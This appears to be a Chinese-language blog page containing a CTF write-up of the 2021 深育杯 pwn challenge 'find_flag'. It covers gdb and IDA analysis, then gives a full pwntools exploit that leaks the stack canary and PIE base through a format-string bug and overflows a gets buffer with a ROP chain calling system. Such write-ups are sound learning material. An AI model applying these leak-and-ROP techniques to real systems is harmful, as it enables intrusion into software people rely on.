@@ -1,0 +1,585 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="canary,pie,格式化字符串漏洞" />
+
+
+<link rel="canonical" href="http://example.com/2023/08/02/find-flag/">
+
+
+
+  <title>
+find_flag - 复现 - PWN的学习 |
+yhuanhuan =  = 不在能知，乃在能行</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">find_flag
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2023-08-02 18:44:10">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-08-02T18:44:10+08:00">2023-08-02</time>
+  </span>
+  <span class="item" title="本文字数">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">本文字数</span>
+    <span>1.4k</span>
+    <span class="text">字</span>
+  </span>
+  <span class="item" title="阅读时长">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">阅读时长</span>
+    <span>1 分钟</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">yhuanhuan</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/04/caejg5tYskU186E.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/HAYmvDsoGfbIVl3.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/1worZdUHTMtXeP3.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/04/wD8Kc2Y5Iu4mEk1.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/04/ibKkDqfNwIytXUL.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/jzioFL8AndHwO3Q.png"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" itemprop="item" rel="index" title="分类于 PWN的学习"><span itemprop="name">PWN的学习</span></a>
+<meta itemprop="position" content="1" /></span>
+<i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E5%A4%8D%E7%8E%B0/" itemprop="item" rel="index" title="分类于 复现"><span itemprop="name">复现</span></a>
+<meta itemprop="position" content="2" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/02/find-flag/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/huanhuan.png">
+    <meta itemprop="name" content="yhuanhuan">
+    <meta itemprop="description" content="不在能知，乃在能行, 欢迎来到Huan的笔记空间~这里主要会记录pwn笔记🌸">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="题目复现深育杯-2021find_flag"><a class="markdownIt-Anchor" href="#题目复现深育杯-2021find_flag">#</a> 题目复现 ——[深育杯 2021] find_flag</h1>
+<p>pie 与 canary 同时开启，并且有格式化字符串。</p>
+<h3 id="检查程序"><a class="markdownIt-Anchor" href="#检查程序">#</a> 检查程序：</h3>
+<p><img data-src="/img/find_flag/image-20230609204936112.png" alt="image-20230609204936112"></p>
+<p>保护很全面。</p>
+<p><img data-src="/img/find_flag/image-20230609205227082.png" alt="image-20230609205227082"></p>
+<p>可以看的出，在第一处有格式化字符串漏洞。</p>
+<h3 id="ida分析"><a class="markdownIt-Anchor" href="#ida分析">#</a> IDA 分析：</h3>
+<p><img data-src="/img/find_flag/image-20230609205448884.png" alt="image-20230609205448884"></p>
+<p>看了一下 mian 函数，将函数重命名，pwn 是我们有漏洞的地方。</p>
+<p><img data-src="/img/find_flag/image-20230609205602697.png" alt="image-20230609205602697"></p>
+<p>可以看到 gets 函数可以进行栈溢出，但是有 canary 保护，所以我们需要泄露 canary，可以利用格式化字符串去泄露 canary 并覆写在栈上。</p>
+<p><img data-src="/img/find_flag/image-20230609205729803.png" alt="image-20230609205729803"></p>
+<p>发现 backdoor。但是开了 pie，我们应该无法利用后们，但是好在<strong>只读变量（const 修饰的）和字符串变量</strong>放入<strong> rodata</strong> 区。还是可以利用的。</p>
+<h3 id="gdb分析"><a class="markdownIt-Anchor" href="#gdb分析">#</a> gdb 分析:</h3>
+<p>打断点在 printf 处（不知到为什么不能在 main 函数处大不了断点，很奇怪</p>
+<p><img data-src="/img/find_flag/image-20230609210601700.png" alt="image-20230609210601700"></p>
+<p>一直步到下图处</p>
+<p><img data-src="/img/find_flag/image-20230609210758887.png" alt="image-20230609210758887"></p>
+<p>看栈信息，很明显能看到 canary——&gt;</p>
+<blockquote>
+<p>0b:0058│             0x7fffffffdd18 ◂— 0x121203e586d31600</p>
+</blockquote>
+<p><img data-src="/img/find_flag/image-20230609210832637.png" alt="image-20230609210832637"></p>
+<p>看一下距格式化字符串的偏移。</p>
+<p><img data-src="/img/find_flag/image-20230609211002101.png" alt="image-20230609211002101"></p>
+<p>但是难点不是在泄露 canary，而是在泄露基址上去，需要了解 pie 和栈，可以看到，在 rbp 下面刚好有一个我们能泄露函数基址，但是为什么是他呢？</p>
+<p>考虑因为这个地址代表了我们的 main 函数结尾的一个部分的地址，我们可以通过这个地址进而计算出栈的基址。</p>
+<p><img data-src="/img/find_flag/image-20230609211705133.png" alt="image-20230609211705133"></p>
+<p>接下来就是确定偏移了（须注意的一点就是需要在 gets 函数输入后，在查看栈的情况，这样更好确定。</p>
+<p><img data-src="/img/find_flag/image-20230609211905134.png" alt="image-20230609211905134"></p>
+<h3 id="exp构造环节"><a class="markdownIt-Anchor" href="#exp构造环节">#</a> exp 构造环节:</h3>
+<p>既然我们找到了，我们就构造 payload1 去泄露 canary 和基址</p>
+<figure class="highlight python"><figcaption data-lang="python"><span>n</span></figcaption><table><tr><td data-num="1"></td><td><pre>paylaod1 <span class="token operator">=</span> <span class="token string">b'%17$p---%19$p'</span></pre></td></tr></table></figure><p>在构造 rop 链的准备。</p>
+<figure class="highlight python"><figcaption data-lang="python"><span>n</span></figcaption><table><tr><td data-num="1"></td><td><pre>Base <span class="token operator">=</span> base <span class="token operator">-</span> <span class="token number">0x146F</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>system <span class="token operator">=</span> Base <span class="token operator">+</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="4"></td><td><pre>catflag <span class="token operator">=</span> Base <span class="token operator">+</span> <span class="token number">0x2004</span> <span class="token comment"># robata 中的字符串</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#ROPgadget --binary file --only 'pop|ret'</span></pre></td></tr><tr><td data-num="6"></td><td><pre>rdi <span class="token operator">=</span> Base <span class="token operator">+</span> <span class="token number">0x14E3</span></pre></td></tr><tr><td data-num="7"></td><td><pre>ret <span class="token operator">=</span> Base <span class="token operator">+</span> <span class="token number">0x101A</span></pre></td></tr></table></figure><h3 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> exp：</h3>
+<figure class="highlight python"><figcaption data-lang="python"><span>n</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>local <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">if</span> local<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'ff'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.anna.nssctf.cn'</span><span class="token punctuation">,</span><span class="token number">28068</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ff'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span></pre></td></tr><tr><td data-num="13"></td><td><pre>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'name? '</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>payload1 <span class="token operator">=</span> <span class="token string">b'%17$p---%19$p'</span></pre></td></tr><tr><td data-num="17"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'you, '</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'---'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre>Base <span class="token operator">=</span> base <span class="token operator">-</span> <span class="token number">0x146F</span></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre>system <span class="token operator">=</span> Base <span class="token operator">+</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="30"></td><td><pre>catflag <span class="token operator">=</span> Base <span class="token operator">+</span> <span class="token number">0x2004</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token comment">#ropgadget</span></pre></td></tr><tr><td data-num="32"></td><td><pre>rdi <span class="token operator">=</span> Base <span class="token operator">+</span> <span class="token number">0x14E3</span></pre></td></tr><tr><td data-num="33"></td><td><pre>ret <span class="token operator">=</span> Base <span class="token operator">+</span> <span class="token number">0x101A</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x38</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>catflag<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'else? '</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h3 id="结果"><a class="markdownIt-Anchor" href="#结果">#</a> 结果：</h3>
+<p><img data-src="/img/find_flag/image-20230609212855635.png" alt="image-20230609212855635"></p>
+
+      <div class="tags">
+          <a href="/tags/canary/" rel="tag"><i class="ic i-tag"></i> canary</a>
+          <a href="/tags/pie/" rel="tag"><i class="ic i-tag"></i> pie</a>
+          <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" rel="tag"><i class="ic i-tag"></i> 格式化字符串漏洞</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-08-05 11:16:35" itemprop="dateModified" datetime="2023-08-05T11:16:35+08:00">2023-08-05</time>
+  </span>
+  <span id="2023/08/02/find-flag/" class="item leancloud_visitors" data-flag-title="find_flag" title="阅读次数">
+      <span class="icon">
+        <i class="ic i-eye"></i>
+      </span>
+      <span class="text">阅读次数</span>
+      <span class="leancloud-visitors-count"></span>
+      <span class="text">次</span>
+  </span>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>yhuanhuan <i class="ic i-at"><em>@</em></i>
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2023/08/02/find-flag/" title="find_flag">http://example.com/2023/08/02/find-flag/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2023/08/03/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;08&#x2F;03&#x2F;xABdev7CEF4h3sR.png" title="国赛复现">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> 复现</span>
+  <h3>国赛复现</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E6%B7%B1%E8%82%B2%E6%9D%AF-2021find_flag"><span class="toc-number">1.</span> <span class="toc-text"> 题目复现 ——[深育杯 2021] find_flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.0.1.</span> <span class="toc-text"> 检查程序：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ida%E5%88%86%E6%9E%90"><span class="toc-number">1.0.2.</span> <span class="toc-text"> IDA 分析：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gdb%E5%88%86%E6%9E%90"><span class="toc-number">1.0.3.</span> <span class="toc-text"> gdb 分析:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp%E6%9E%84%E9%80%A0%E7%8E%AF%E8%8A%82"><span class="toc-number">1.0.4.</span> <span class="toc-text"> exp 构造环节:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.0.5.</span> <span class="toc-text"> exp：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C"><span class="toc-number">1.0.6.</span> <span class="toc-text"> 结果：</span></a></li></ol></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li class="active"><a href="/2023/08/02/find-flag/" rel="bookmark" title="find_flag">find_flag</a></li><li><a href="/2023/08/03/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/" rel="bookmark" title="国赛复现">国赛复现</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="yhuanhuan"
+      data-src="/images/huanhuan.png">
+  <p class="name" itemprop="name">yhuanhuan</p>
+  <div class="description" itemprop="description">欢迎来到Huan的笔记空间~这里主要会记录pwn笔记🌸</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">11</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">7</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">13</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lodWFuaHVhbjAx" title="https:&#x2F;&#x2F;github.com&#x2F;yhuanhuan01"><i class="ic i-github"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 web的学习">web的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/web%E7%9A%84%E5%AD%A6%E4%B9%A0/wp/" title="分类于 wp">wp</a>
+</div>
+
+    <span><a href="/2023/08/24/web-new/" title="web_new">web_new</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E5%A4%8D%E7%8E%B0/" title="分类于 复现">复现</a>
+</div>
+
+    <span><a href="/2023/08/02/find-flag/" title="find_flag">find_flag</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E5%A4%8D%E7%8E%B0/" title="分类于 复现">复现</a>
+</div>
+
+    <span><a href="/2023/08/03/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="国赛复现">国赛复现</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
+</div>
+
+    <span><a href="/2023/08/11/unlink/" title="unlink">unlink</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E7%9F%A5%E8%AF%86/" title="分类于 知识">知识</a>
+</div>
+
+    <span><a href="/2023/08/09/bins/" title="bins">bins</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Write-up/" title="分类于 Write_up">Write_up</a>
+</div>
+
+    <span><a href="/2023/08/13/Nep-wp/" title="Nep__wp">Nep__wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
+</div>
+
+    <span><a href="/2023/08/04/b-canary/" title="b_canary">b_canary</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
+</div>
+
+    <span><a href="/2023/08/10/uaf/" title="uaf">uaf</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
+</div>
+
+    <span><a href="/2023/08/03/csu/" title="csu">csu</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
+</div>
+
+    <span><a href="/2023/08/03/srop/" title="srop">srop</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">yhuanhuan @ yhuanhuan</span>
+  </div>
+  <div class="count">
+    <span class="post-meta-item-icon">
+      <i class="ic i-chart-area"></i>
+    </span>
+    <span title="站点总字数">74k 字</span>
+
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="ic i-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:07</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/08/02/find-flag/',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
